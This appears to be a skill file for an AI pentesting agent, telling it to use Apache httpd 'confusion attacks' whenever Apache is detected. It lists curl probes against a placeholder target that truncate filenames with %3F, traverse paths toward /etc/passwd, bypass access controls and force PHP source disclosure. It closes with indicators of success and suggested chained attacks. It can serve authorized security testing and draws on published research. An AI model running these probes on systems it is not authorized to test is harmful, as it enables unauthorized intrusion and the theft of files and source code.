---
name: apache-confusion-attacks
description: Exploit Apache httpd semantic parsing ambiguities for ACL bypass, SSRF, source disclosure, and RCE. Use when Apache httpd detected (Server header, .htaccess, mod_rewrite).
---

# Apache Confusion Attacks

## Pattern
- Apache httpd with mod_rewrite enabled (common in most deployments)
- Multiple modules processing same request (mod_rewrite, mod_alias, mod_cgi)
- Handler field inconsistencies across module pipeline
- DocumentRoot-relative path resolution in use

## Probe
**Filename Confusion — path truncation via `%3F`:**
```
curl 'https://target/admin.php%3Fooo.php'
curl 'https://target/user/orange%2Fsecret.yml%3F'
```
**DocumentRoot Confusion — source disclosure:**
```
curl 'https://target/var/www/html/../../etc/passwd'
curl 'https://target/server-status%3Ffoo'
```
**Handler Confusion — force source disclosure:**
```
curl 'https://target/cgi-bin/../app.php'
curl 'https://target/index.php/etc/passwd'
```
Key: `%3F` truncates filename for mod_rewrite but not for file serving. Path traversal via `%2F` decoded differently by rewrite vs filesystem modules.

## Indicators
- 200 response with file content from outside expected paths
- PHP/CGI source code returned as plaintext (handler confusion)
- ACL-protected paths accessible with modified URL
- Error pages revealing internal path structure

## Chain With
- web-cache-deception-path (Apache confusion + CDN cache = stored WCD)
- unicode-normalization-bypass (combine encoding tricks with path confusion)

## Reference
https://blog.orange.tw/posts/2024-08-confusion-attacks-en/
